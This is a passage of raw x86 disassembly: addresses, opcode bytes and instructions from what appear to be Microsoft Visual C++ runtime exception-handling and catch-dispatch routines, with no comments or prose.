  409937:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40993a:	6a 00                	push   $0x0
  40993c:	6a 00                	push   $0x0
  40993e:	89 88 94 00 00 00    	mov    %ecx,0x94(%eax)
  409944:	e8 16 a2 ff ff       	call   0x403b5f
  409949:	cc                   	int3
  40994a:	6a 2c                	push   $0x2c
  40994c:	68 90 dd 40 00       	push   $0x40dd90
  409951:	e8 7a b1 ff ff       	call   0x404ad0
  409956:	8b d9                	mov    %ecx,%ebx
  409958:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40995b:	8b 75 08             	mov    0x8(%ebp),%esi
  40995e:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  409961:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  409965:	8b 47 fc             	mov    -0x4(%edi),%eax
  409968:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40996b:	ff 76 18             	push   0x18(%esi)
  40996e:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  409971:	50                   	push   %eax
  409972:	e8 90 fb ff ff       	call   0x409507
  409977:	59                   	pop    %ecx
  409978:	59                   	pop    %ecx
  409979:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40997c:	e8 04 cd ff ff       	call   0x406685
  409981:	8b 80 88 00 00 00    	mov    0x88(%eax),%eax
  409987:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40998a:	e8 f6 cc ff ff       	call   0x406685
  40998f:	8b 80 8c 00 00 00    	mov    0x8c(%eax),%eax
  409995:	89 45 d0             	mov    %eax,-0x30(%ebp)
  409998:	e8 e8 cc ff ff       	call   0x406685
  40999d:	89 b0 88 00 00 00    	mov    %esi,0x88(%eax)
  4099a3:	e8 dd cc ff ff       	call   0x406685
  4099a8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4099ab:	89 88 8c 00 00 00    	mov    %ecx,0x8c(%eax)
  4099b1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4099b5:	33 c0                	xor    %eax,%eax
  4099b7:	40                   	inc    %eax
  4099b8:	89 45 10             	mov    %eax,0x10(%ebp)
  4099bb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4099be:	ff 75 1c             	push   0x1c(%ebp)
  4099c1:	ff 75 18             	push   0x18(%ebp)
  4099c4:	53                   	push   %ebx
  4099c5:	ff 75 14             	push   0x14(%ebp)
  4099c8:	57                   	push   %edi
  4099c9:	e8 de fb ff ff       	call   0x4095ac
  4099ce:	83 c4 14             	add    $0x14,%esp
  4099d1:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4099d4:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4099d8:	eb 6f                	jmp    0x409a49
  4099da:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4099dd:	e8 e6 fd ff ff       	call   0x4097c8
  4099e2:	c3                   	ret
  4099e3:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4099e6:	e8 9a cc ff ff       	call   0x406685
  4099eb:	83 a0 0c 02 00 00 00 	andl   $0x0,0x20c(%eax)
  4099f2:	8b 75 14             	mov    0x14(%ebp),%esi
  4099f5:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4099f8:	81 7e 04 80 00 00 00 	cmpl   $0x80,0x4(%esi)
  4099ff:	7f 06                	jg     0x409a07
  409a01:	0f be 4f 08          	movsbl 0x8(%edi),%ecx
  409a05:	eb 03                	jmp    0x409a0a
  409a07:	8b 4f 08             	mov    0x8(%edi),%ecx
  409a0a:	8b 5e 10             	mov    0x10(%esi),%ebx
  409a0d:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
  409a11:	8b 45 e0             	mov    -0x20(%ebp),%eax
  409a14:	3b 46 0c             	cmp    0xc(%esi),%eax
  409a17:	73 18                	jae    0x409a31
  409a19:	6b c0 14             	imul   $0x14,%eax,%eax
  409a1c:	8b 54 18 04          	mov    0x4(%eax,%ebx,1),%edx
  409a20:	3b ca                	cmp    %edx,%ecx
  409a22:	7e 41                	jle    0x409a65
  409a24:	3b 4c 18 08          	cmp    0x8(%eax,%ebx,1),%ecx
  409a28:	7f 3b                	jg     0x409a65
  409a2a:	8b 46 08             	mov    0x8(%esi),%eax
  409a2d:	8b 4c d0 08          	mov    0x8(%eax,%edx,8),%ecx
  409a31:	51                   	push   %ecx
  409a32:	56                   	push   %esi
  409a33:	6a 00                	push   $0x0
  409a35:	57                   	push   %edi
  409a36:	e8 b1 fc ff ff       	call   0x4096ec
  409a3b:	83 c4 10             	add    $0x10,%esp
  409a3e:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  409a42:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409a46:	8b 75 08             	mov    0x8(%ebp),%esi
  409a49:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409a50:	c7 45 10 00 00 00 00 	movl   $0x0,0x10(%ebp)
  409a57:	e8 14 00 00 00       	call   0x409a70
  409a5c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  409a5f:	e8 b1 b0 ff ff       	call   0x404b15
  409a64:	c3                   	ret
  409a65:	ff 45 e0             	incl   -0x20(%ebp)
  409a68:	eb a7                	jmp    0x409a11
  409a6a:	8b 7d 0c             	mov    0xc(%ebp),%edi
  409a6d:	8b 75 08             	mov    0x8(%ebp),%esi
  409a70:	8b 45 dc             	mov    -0x24(%ebp),%eax
  409a73:	89 47 fc             	mov    %eax,-0x4(%edi)
  409a76:	ff 75 d8             	push   -0x28(%ebp)
  409a79:	e8 dc fa ff ff       	call   0x40955a
  409a7e:	59                   	pop    %ecx
  409a7f:	e8 01 cc ff ff       	call   0x406685
  409a84:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  409a87:	89 88 88 00 00 00    	mov    %ecx,0x88(%eax)
  409a8d:	e8 f3 cb ff ff       	call   0x406685
  409a92:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  409a95:	89 88 8c 00 00 00    	mov    %ecx,0x8c(%eax)
  409a9b:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
  409aa1:	75 42                	jne    0x409ae5
  409aa3:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  409aa7:	75 3c                	jne    0x409ae5
  409aa9:	8b 46 14             	mov    0x14(%esi),%eax
  409aac:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  409ab1:	74 0e                	je     0x409ac1
  409ab3:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  409ab8:	74 07                	je     0x409ac1
  409aba:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  409abf:	75 24                	jne    0x409ae5
  409ac1:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  409ac5:	75 1e                	jne    0x409ae5
  409ac7:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  409acb:	74 18                	je     0x409ae5
  409acd:	ff 76 18             	push   0x18(%esi)
  409ad0:	e8 5e fa ff ff       	call   0x409533
  409ad5:	59                   	pop    %ecx
  409ad6:	85 c0                	test   %eax,%eax
  409ad8:	74 0b                	je     0x409ae5
  409ada:	ff 75 10             	push   0x10(%ebp)
  409add:	56                   	push   %esi
  409ade:	e8 2a fd ff ff       	call   0x40980d
  409ae3:	59                   	pop    %ecx
  409ae4:	59                   	pop    %ecx
  409ae5:	c3                   	ret
  409ae6:	6a 0c                	push   $0xc
  409ae8:	68 b8 dd 40 00       	push   $0x40ddb8
  409aed:	e8 de af ff ff       	call   0x404ad0
  409af2:	33 d2                	xor    %edx,%edx
  409af4:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  409af7:	8b 45 10             	mov    0x10(%ebp),%eax
  409afa:	8b 48 04             	mov    0x4(%eax),%ecx
  409afd:	3b ca                	cmp    %edx,%ecx
  409aff:	0f 84 58 01 00 00    	je     0x409c5d
  409b05:	38 51 08             	cmp    %dl,0x8(%ecx)
  409b08:	0f 84 4f 01 00 00    	je     0x409c5d
  409b0e:	8b 48 08             	mov    0x8(%eax),%ecx
  409b11:	3b ca                	cmp    %edx,%ecx
  409b13:	75 0c                	jne    0x409b21
  409b15:	f7 00 00 00 00 80    	testl  $0x80000000,(%eax)
  409b1b:	0f 84 3c 01 00 00    	je     0x409c5d
  409b21:	8b 00                	mov    (%eax),%eax
  409b23:	8b 75 0c             	mov    0xc(%ebp),%esi
  409b26:	85 c0                	test   %eax,%eax
  409b28:	78 04                	js     0x409b2e
  409b2a:	8d 74 31 0c          	lea    0xc(%ecx,%esi,1),%esi
  409b2e:	89 55 fc             	mov    %edx,-0x4(%ebp)
  409b31:	33 db                	xor    %ebx,%ebx
  409b33:	43                   	inc    %ebx
  409b34:	53                   	push   %ebx
  409b35:	a8 08                	test   $0x8,%al
  409b37:	74 41                	je     0x409b7a
  409b39:	8b 7d 08             	mov    0x8(%ebp),%edi
  409b3c:	ff 77 18             	push   0x18(%edi)
  409b3f:	e8 2e 08 00 00       	call   0x40a372
  409b44:	59                   	pop    %ecx
  409b45:	59                   	pop    %ecx
  409b46:	85 c0                	test   %eax,%eax
  409b48:	0f 84 f2 00 00 00    	je     0x409c40
  409b4e:	53                   	push   %ebx
  409b4f:	56                   	push   %esi
  409b50:	e8 1d 08 00 00       	call   0x40a372
  409b55:	59                   	pop    %ecx
  409b56:	59                   	pop    %ecx
  409b57:	85 c0                	test   %eax,%eax
  409b59:	0f 84 e1 00 00 00    	je     0x409c40
  409b5f:	8b 47 18             	mov    0x18(%edi),%eax
  409b62:	89 06                	mov    %eax,(%esi)
  409b64:	8b 4d 14             	mov    0x14(%ebp),%ecx
  409b67:	83 c1 08             	add    $0x8,%ecx
  409b6a:	51                   	push   %ecx
  409b6b:	50                   	push   %eax
  409b6c:	e8 f1 fc ff ff       	call   0x409862
  409b71:	59                   	pop    %ecx
  409b72:	59                   	pop    %ecx
  409b73:	89 06                	mov    %eax,(%esi)
  409b75:	e9 cb 00 00 00       	jmp    0x409c45
  409b7a:	8b 7d 14             	mov    0x14(%ebp),%edi
  409b7d:	8b 45 08             	mov    0x8(%ebp),%eax
  409b80:	ff 70 18             	push   0x18(%eax)
  409b83:	84 1f                	test   %bl,(%edi)
  409b85:	74 48                	je     0x409bcf
  409b87:	e8 e6 07 00 00       	call   0x40a372
  409b8c:	59                   	pop    %ecx
  409b8d:	59                   	pop    %ecx
  409b8e:	85 c0                	test   %eax,%eax
  409b90:	0f 84 aa 00 00 00    	je     0x409c40
  409b96:	53                   	push   %ebx
  409b97:	56                   	push   %esi
  409b98:	e8 d5 07 00 00       	call   0x40a372
  409b9d:	59                   	pop    %ecx
  409b9e:	59                   	pop    %ecx
  409b9f:	85 c0                	test   %eax,%eax
  409ba1:	0f 84 99 00 00 00    	je     0x409c40
  409ba7:	ff 77 14             	push   0x14(%edi)
  409baa:	8b 45 08             	mov    0x8(%ebp),%eax
  409bad:	ff 70 18             	push   0x18(%eax)
  409bb0:	56                   	push   %esi
  409bb1:	e8 8a 97 ff ff       	call   0x403340
  409bb6:	83 c4 0c             	add    $0xc,%esp
  409bb9:	83 7f 14 04          	cmpl   $0x4,0x14(%edi)
  409bbd:	0f 85 82 00 00 00    	jne    0x409c45
  409bc3:	8b 06                	mov    (%esi),%eax
  409bc5:	85 c0                	test   %eax,%eax
  409bc7:	74 7c                	je     0x409c45
  409bc9:	83 c7 08             	add    $0x8,%edi
  409bcc:	57                   	push   %edi
  409bcd:	eb 9c                	jmp    0x409b6b
  409bcf:	39 57 18             	cmp    %edx,0x18(%edi)
  409bd2:	75 38                	jne    0x409c0c
  409bd4:	e8 99 07 00 00       	call   0x40a372
  409bd9:	59                   	pop    %ecx
  409bda:	59                   	pop    %ecx
  409bdb:	85 c0                	test   %eax,%eax
  409bdd:	74 61                	je     0x409c40
  409bdf:	53                   	push   %ebx
  409be0:	56                   	push   %esi
  409be1:	e8 8c 07 00 00       	call   0x40a372
  409be6:	59                   	pop    %ecx
  409be7:	59                   	pop    %ecx
  409be8:	85 c0                	test   %eax,%eax
  409bea:	74 54                	je     0x409c40
  409bec:	ff 77 14             	push   0x14(%edi)
  409bef:	83 c7 08             	add    $0x8,%edi
  409bf2:	57                   	push   %edi
  409bf3:	8b 45 08             	mov    0x8(%ebp),%eax
  409bf6:	ff 70 18             	push   0x18(%eax)
  409bf9:	e8 64 fc ff ff       	call   0x409862
  409bfe:	59                   	pop    %ecx
  409bff:	59                   	pop    %ecx
  409c00:	50                   	push   %eax
  409c01:	56                   	push   %esi
  409c02:	e8 39 97 ff ff       	call   0x403340
  409c07:	83 c4 0c             	add    $0xc,%esp
  409c0a:	eb 39                	jmp    0x409c45
  409c0c:	e8 61 07 00 00       	call   0x40a372
  409c11:	59                   	pop    %ecx
  409c12:	59                   	pop    %ecx
  409c13:	85 c0                	test   %eax,%eax
  409c15:	74 29                	je     0x409c40
  409c17:	53                   	push   %ebx
  409c18:	56                   	push   %esi
  409c19:	e8 54 07 00 00       	call   0x40a372
  409c1e:	59                   	pop    %ecx
  409c1f:	59                   	pop    %ecx
  409c20:	85 c0                	test   %eax,%eax
  409c22:	74 1c                	je     0x409c40
  409c24:	ff 77 18             	push   0x18(%edi)
  409c27:	e8 46 07 00 00       	call   0x40a372
  409c2c:	59                   	pop    %ecx
  409c2d:	85 c0                	test   %eax,%eax
  409c2f:	74 0f                	je     0x409c40
  409c31:	f6 07 04             	testb  $0x4,(%edi)
  409c34:	6a 00                	push   $0x0
  409c36:	58                   	pop    %eax
  409c37:	0f 95 c0             	setne  %al
  409c3a:	40                   	inc    %eax
  409c3b:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  409c3e:	eb 05                	jmp    0x409c45
  409c40:	e8 a7 d1 ff ff       	call   0x406dec
  409c45:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409c4c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  409c4f:	eb 0e                	jmp    0x409c5f
  409c51:	33 c0                	xor    %eax,%eax
  409c53:	40                   	inc    %eax
  409c54:	c3                   	ret
  409c55:	8b 65 e8             	mov    -0x18(%ebp),%esp
  409c58:	e8 43 d1 ff ff       	call   0x406da0
  409c5d:	33 c0                	xor    %eax,%eax
  409c5f:	e8 b1 ae ff ff       	call   0x404b15
  409c64:	c3                   	ret
  409c65:	6a 08                	push   $0x8
  409c67:	68 d8 dd 40 00       	push   $0x40ddd8
  409c6c:	e8 5f ae ff ff       	call   0x404ad0
  409c71:	8b 45 10             	mov    0x10(%ebp),%eax
  409c74:	f7 00 00 00 00 80    	testl  $0x80000000,(%eax)
  409c7a:	74 05                	je     0x409c81
  409c7c:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  409c7f:	eb 0a                	jmp    0x409c8b
  409c81:	8b 48 08             	mov    0x8(%eax),%ecx
  409c84:	8b 55 0c             	mov    0xc(%ebp),%edx
  409c87:	8d 5c 11 0c          	lea    0xc(%ecx,%edx,1),%ebx
  409c8b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409c8f:	8b 75 14             	mov    0x14(%ebp),%esi
  409c92:	56                   	push   %esi
  409c93:	50                   	push   %eax
  409c94:	ff 75 0c             	push   0xc(%ebp)
  409c97:	8b 7d 08             	mov    0x8(%ebp),%edi
  409c9a:	57                   	push   %edi
  409c9b:	e8 46 fe ff ff       	call   0x409ae6
  409ca0:	83 c4 10             	add    $0x10,%esp
  409ca3:	48                   	dec    %eax
  409ca4:	74 1f                	je     0x409cc5
  409ca6:	48                   	dec    %eax
  409ca7:	75 34                	jne    0x409cdd
  409ca9:	6a 01                	push   $0x1
  409cab:	8d 46 08             	lea    0x8(%esi),%eax
  409cae:	50                   	push   %eax
  409caf:	ff 77 18             	push   0x18(%edi)
  409cb2:	e8 ab fb ff ff       	call   0x409862
  409cb7:	59                   	pop    %ecx
  409cb8:	59                   	pop    %ecx
  409cb9:	50                   	push   %eax
  409cba:	ff 76 18             	push   0x18(%esi)
  409cbd:	53                   	push   %ebx
  409cbe:	e8 97 f5 ff ff       	call   0x40925a
  409cc3:	eb 18                	jmp    0x409cdd
  409cc5:	8d 46 08             	lea    0x8(%esi),%eax
  409cc8:	50                   	push   %eax
  409cc9:	ff 77 18             	push   0x18(%edi)
  409ccc:	e8 91 fb ff ff       	call   0x409862
  409cd1:	59                   	pop    %ecx
  409cd2:	59                   	pop    %ecx
  409cd3:	50                   	push   %eax
  409cd4:	ff 76 18             	push   0x18(%esi)
  409cd7:	53                   	push   %ebx
  409cd8:	e8 7d f5 ff ff       	call   0x40925a
  409cdd:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409ce4:	e8 2c ae ff ff       	call   0x404b15
  409ce9:	c3                   	ret
  409cea:	33 c0                	xor    %eax,%eax
  409cec:	40                   	inc    %eax
  409ced:	c3                   	ret
  409cee:	8b 65 e8             	mov    -0x18(%ebp),%esp
  409cf1:	e8 aa d0 ff ff       	call   0x406da0
  409cf6:	cc                   	int3
  409cf7:	8b ff                	mov    %edi,%edi
  409cf9:	55                   	push   %ebp
  409cfa:	8b ec                	mov    %esp,%ebp
  409cfc:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  409d00:	74 10                	je     0x409d12
  409d02:	ff 75 18             	push   0x18(%ebp)
  409d05:	53                   	push   %ebx
  409d06:	56                   	push   %esi
  409d07:	ff 75 08             	push   0x8(%ebp)
  409d0a:	e8 56 ff ff ff       	call   0x409c65
  409d0f:	83 c4 10             	add    $0x10,%esp
  409d12:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  409d16:	ff 75 08             	push   0x8(%ebp)
  409d19:	75 03                	jne    0x409d1e
  409d1b:	56                   	push   %esi
  409d1c:	eb 03                	jmp    0x409d21
  409d1e:	ff 75 20             	push   0x20(%ebp)
  409d21:	e8 3b f5 ff ff       	call   0x409261
  409d26:	ff 37                	push   (%edi)
  409d28:	ff 75 14             	push   0x14(%ebp)
  409d2b:	ff 75 10             	push   0x10(%ebp)
  409d2e:	56                   	push   %esi
  409d2f:	e8 b8 f9 ff ff       	call   0x4096ec
  409d34:	8b 47 04             	mov    0x4(%edi),%eax
  409d37:	68 00 01 00 00       	push   $0x100
  409d3c:	ff 75 1c             	push   0x1c(%ebp)
  409d3f:	40                   	inc    %eax
  409d40:	ff 75 14             	push   0x14(%ebp)
  409d43:	89 46 08             	mov    %eax,0x8(%esi)
  409d46:	ff 75 0c             	push   0xc(%ebp)
  409d49:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  409d4c:	56                   	push   %esi
  409d4d:	ff 75 08             	push   0x8(%ebp)
  409d50:	e8 f5 fb ff ff       	call   0x40994a
  409d55:	83 c4 28             	add    $0x28,%esp
  409d58:	85 c0                	test   %eax,%eax
  409d5a:	74 07                	je     0x409d63
  409d5c:	56                   	push   %esi
  409d5d:	50                   	push   %eax
  409d5e:	e8 c5 f4 ff ff       	call   0x409228
  409d63:	5d                   	pop    %ebp
  409d64:	c3                   	ret
  409d65:	8b ff                	mov    %edi,%edi
  409d67:	55                   	push   %ebp
  409d68:	8b ec                	mov    %esp,%ebp
  409d6a:	83 ec 0c             	sub    $0xc,%esp
  409d6d:	56                   	push   %esi
  409d6e:	8b 75 08             	mov    0x8(%ebp),%esi
  409d71:	81 3e 03 00 00 80    	cmpl   $0x80000003,(%esi)
  409d77:	0f 84 ec 00 00 00    	je     0x409e69
  409d7d:	57                   	push   %edi
  409d7e:	e8 02 c9 ff ff       	call   0x406685
  409d83:	83 b8 80 00 00 00 00 	cmpl   $0x0,0x80(%eax)
  409d8a:	74 47                	je     0x409dd3
  409d8c:	e8 f4 c8 ff ff       	call   0x406685
  409d91:	8d b8 80 00 00 00    	lea    0x80(%eax),%edi
  409d97:	e8 39 c7 ff ff       	call   0x4064d5
  409d9c:	39 07                	cmp    %eax,(%edi)
  409d9e:	74 33                	je     0x409dd3
  409da0:	8b 06                	mov    (%esi),%eax
  409da2:	3d 4d 4f 43 e0       	cmp    $0xe0434f4d,%eax
  409da7:	74 2a                	je     0x409dd3
  409da9:	3d 52 43 43 e0       	cmp    $0xe0434352,%eax
  409dae:	74 23                	je     0x409dd3
  409db0:	ff 75 24             	push   0x24(%ebp)
  409db3:	ff 75 20             	push   0x20(%ebp)
  409db6:	ff 75 18             	push   0x18(%ebp)
  409db9:	ff 75 14             	push   0x14(%ebp)
  409dbc:	ff 75 10             	push   0x10(%ebp)
  409dbf:	ff 75 0c             	push   0xc(%ebp)
  409dc2:	56                   	push   %esi
  409dc3:	e8 56 f5 ff ff       	call   0x40931e
  409dc8:	83 c4 1c             	add    $0x1c,%esp
  409dcb:	85 c0                	test   %eax,%eax
  409dcd:	0f 85 95 00 00 00    	jne    0x409e68
  409dd3:	8b 7d 18             	mov    0x18(%ebp),%edi
  409dd6:	83 7f 0c 00          	cmpl   $0x0,0xc(%edi)
  409dda:	75 05                	jne    0x409de1
  409ddc:	e8 0b d0 ff ff       	call   0x406dec
  409de1:	8b 75 1c             	mov    0x1c(%ebp),%esi
  409de4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409de7:	50                   	push   %eax
  409de8:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409deb:	50                   	push   %eax
  409dec:	56                   	push   %esi
  409ded:	ff 75 20             	push   0x20(%ebp)
  409df0:	57                   	push   %edi
  409df1:	e8 9e f6 ff ff       	call   0x409494
  409df6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  409df9:	83 c4 14             	add    $0x14,%esp
  409dfc:	3b 4d f4             	cmp    -0xc(%ebp),%ecx
  409dff:	73 67                	jae    0x409e68
  409e01:	83 c0 0c             	add    $0xc,%eax
  409e04:	89 45 f8             	mov    %eax,-0x8(%ebp)
  409e07:	53                   	push   %ebx
  409e08:	8d 78 f4             	lea    -0xc(%eax),%edi
  409e0b:	3b 37                	cmp    (%edi),%esi
  409e0d:	7c 47                	jl     0x409e56
  409e0f:	3b 70 f8             	cmp    -0x8(%eax),%esi
  409e12:	7f 42                	jg     0x409e56
  409e14:	8b 08                	mov    (%eax),%ecx
  409e16:	c1 e1 04             	shl    $0x4,%ecx
  409e19:	03 48 04             	add    0x4(%eax),%ecx
  409e1c:	8b 51 f4             	mov    -0xc(%ecx),%edx
  409e1f:	85 d2                	test   %edx,%edx
  409e21:	74 06                	je     0x409e29
  409e23:	80 7a 08 00          	cmpb   $0x0,0x8(%edx)
  409e27:	75 2d                	jne    0x409e56
  409e29:	8d 59 f0             	lea    -0x10(%ecx),%ebx
  409e2c:	f6 03 40             	testb  $0x40,(%ebx)
  409e2f:	75 25                	jne    0x409e56
  409e31:	ff 75 24             	push   0x24(%ebp)
  409e34:	8b 75 0c             	mov    0xc(%ebp),%esi
  409e37:	ff 75 20             	push   0x20(%ebp)
  409e3a:	6a 00                	push   $0x0
  409e3c:	ff 75 18             	push   0x18(%ebp)
  409e3f:	ff 75 14             	push   0x14(%ebp)
  409e42:	ff 75 10             	push   0x10(%ebp)
  409e45:	ff 75 08             	push   0x8(%ebp)
  409e48:	e8 aa fe ff ff       	call   0x409cf7
  409e4d:	8b 75 1c             	mov    0x1c(%ebp),%esi
  409e50:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409e53:	83 c4 1c             	add    $0x1c,%esp
  409e56:	ff 45 fc             	incl   -0x4(%ebp)
  409e59:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  409e5c:	83 c0 14             	add    $0x14,%eax
  409e5f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  409e62:	3b 4d f4             	cmp    -0xc(%ebp),%ecx
  409e65:	72 a1                	jb     0x409e08
  409e67:	5b                   	pop    %ebx
  409e68:	5f                   	pop    %edi
  409e69:	5e                   	pop    %esi
  409e6a:	c9                   	leave
  409e6b:	c3                   	ret
  409e6c:	8b ff                	mov    %edi,%edi
  409e6e:	55                   	push   %ebp
  409e6f:	8b ec                	mov    %esp,%ebp
  409e71:	83 ec 34             	sub    $0x34,%esp
  409e74:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409e77:	53                   	push   %ebx
  409e78:	8b 5d 18             	mov    0x18(%ebp),%ebx
  409e7b:	8b 43 04             	mov    0x4(%ebx),%eax
  409e7e:	56                   	push   %esi
  409e7f:	57                   	push   %edi
  409e80:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  409e84:	3d 80 00 00 00       	cmp    $0x80,%eax
  409e89:	7f 06                	jg     0x409e91
  409e8b:	0f be 49 08          	movsbl 0x8(%ecx),%ecx
  409e8f:	eb 03                	jmp    0x409e94
  409e91:	8b 49 08             	mov    0x8(%ecx),%ecx
  409e94:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  409e97:	83 f9 ff             	cmp    $0xffffffff,%ecx
  409e9a:	7c 04                	jl     0x409ea0
  409e9c:	3b c8                	cmp    %eax,%ecx
  409e9e:	7c 05                	jl     0x409ea5
  409ea0:	e8 47 cf ff ff       	call   0x406dec
  409ea5:	8b 75 08             	mov    0x8(%ebp),%esi
  409ea8:	bf 63 73 6d e0       	mov    $0xe06d7363,%edi
  409ead:	39 3e                	cmp    %edi,(%esi)
  409eaf:	0f 85 e8 02 00 00    	jne    0x40a19d
  409eb5:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  409eb9:	bb 20 05 93 19       	mov    $0x19930520,%ebx
  409ebe:	0f 85 29 01 00 00    	jne    0x409fed
  409ec4:	8b 46 14             	mov    0x14(%esi),%eax
  409ec7:	3b c3                	cmp    %ebx,%eax
  409ec9:	74 12                	je     0x409edd
  409ecb:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  409ed0:	74 0b                	je     0x409edd
  409ed2:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  409ed7:	0f 85 10 01 00 00    	jne    0x409fed
  409edd:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  409ee1:	0f 85 06 01 00 00    	jne    0x409fed
  409ee7:	e8 99 c7 ff ff       	call   0x406685
  409eec:	83 b8 88 00 00 00 00 	cmpl   $0x0,0x88(%eax)
  409ef3:	0f 84 e3 02 00 00    	je     0x40a1dc
  409ef9:	e8 87 c7 ff ff       	call   0x406685
  409efe:	8b b0 88 00 00 00    	mov    0x88(%eax),%esi
  409f04:	89 75 08             	mov    %esi,0x8(%ebp)
  409f07:	e8 79 c7 ff ff       	call   0x406685
  409f0c:	8b 80 8c 00 00 00    	mov    0x8c(%eax),%eax
  409f12:	6a 01                	push   $0x1
  409f14:	56                   	push   %esi
  409f15:	89 45 10             	mov    %eax,0x10(%ebp)
  409f18:	e8 55 04 00 00       	call   0x40a372
  409f1d:	59                   	pop    %ecx
  409f1e:	59                   	pop    %ecx
  409f1f:	85 c0                	test   %eax,%eax
  409f21:	75 05                	jne    0x409f28
  409f23:	e8 c4 ce ff ff       	call   0x406dec
  409f28:	39 3e                	cmp    %edi,(%esi)
  409f2a:	75 26                	jne    0x409f52
  409f2c:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  409f30:	75 20                	jne    0x409f52
  409f32:	8b 46 14             	mov    0x14(%esi),%eax
  409f35:	3b c3                	cmp    %ebx,%eax
  409f37:	74 0e                	je     0x409f47
  409f39:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  409f3e:	74 07                	je     0x409f47
  409f40:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  409f45:	75 0b                	jne    0x409f52
  409f47:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  409f4b:	75 05                	jne    0x409f52
  409f4d:	e8 9a ce ff ff       	call   0x406dec
  409f52:	e8 2e c7 ff ff       	call   0x406685
  409f57:	83 b8 94 00 00 00 00 	cmpl   $0x0,0x94(%eax)
  409f5e:	0f 84 89 00 00 00    	je     0x409fed
  409f64:	e8 1c c7 ff ff       	call   0x406685
  409f69:	8b b8 94 00 00 00    	mov    0x94(%eax),%edi
  409f6f:	e8 11 c7 ff ff       	call   0x406685
  409f74:	ff 75 08             	push   0x8(%ebp)
  409f77:	33 f6                	xor    %esi,%esi
  409f79:	89 b0 94 00 00 00    	mov    %esi,0x94(%eax)
  409f7f:	e8 07 f9 ff ff       	call   0x40988b
  409f84:	59                   	pop    %ecx
  409f85:	84 c0                	test   %al,%al
  409f87:	75 5c                	jne    0x409fe5
  409f89:	33 db                	xor    %ebx,%ebx
  409f8b:	39 1f                	cmp    %ebx,(%edi)
  409f8d:	7e 1d                	jle    0x409fac
  409f8f:	8b 47 04             	mov    0x4(%edi),%eax
  409f92:	8b 4c 03 04          	mov    0x4(%ebx,%eax,1),%ecx
  409f96:	68 b8 07 41 00       	push   $0x4107b8
  409f9b:	e8 93 91 ff ff       	call   0x403133
  409fa0:	84 c0                	test   %al,%al
  409fa2:	75 0d                	jne    0x409fb1
  409fa4:	46                   	inc    %esi
  409fa5:	83 c3 10             	add    $0x10,%ebx
  409fa8:	3b 37                	cmp    (%edi),%esi
  409faa:	7c e3                	jl     0x409f8f
  409fac:	e8 ef cd ff ff       	call   0x406da0
  409fb1:	6a 01                	push   $0x1
  409fb3:	ff 75 08             	push   0x8(%ebp)
  409fb6:	e8 52 f8 ff ff       	call   0x40980d
  409fbb:	59                   	pop    %ecx
  409fbc:	59                   	pop    %ecx
  409fbd:	8d 45 08             	lea    0x8(%ebp),%eax
  409fc0:	50                   	push   %eax
  409fc1:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  409fc4:	c7 45 08 34 d4 40 00 	movl   $0x40d434,0x8(%ebp)
  409fcb:	e8 0b 92 ff ff       	call   0x4031db
  409fd0:	68 f4 dd 40 00       	push   $0x40ddf4
  409fd5:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409fd8:	50                   	push   %eax
  409fd9:	c7 45 cc 2c d4 40 00 	movl   $0x40d42c,-0x34(%ebp)
